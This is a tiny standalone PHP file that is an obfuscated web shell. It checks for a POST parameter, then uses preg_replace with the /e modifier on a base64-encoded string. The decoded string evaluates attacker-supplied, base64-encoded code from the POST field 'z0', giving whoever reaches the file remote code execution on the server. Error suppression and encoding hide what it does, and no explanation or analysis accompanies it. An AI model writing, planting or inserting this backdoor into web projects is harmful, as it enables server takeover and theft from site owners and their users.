<?php 
@$a = $_POST['x']; 
if(isset($a)){ 
@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); 
} 
?> 
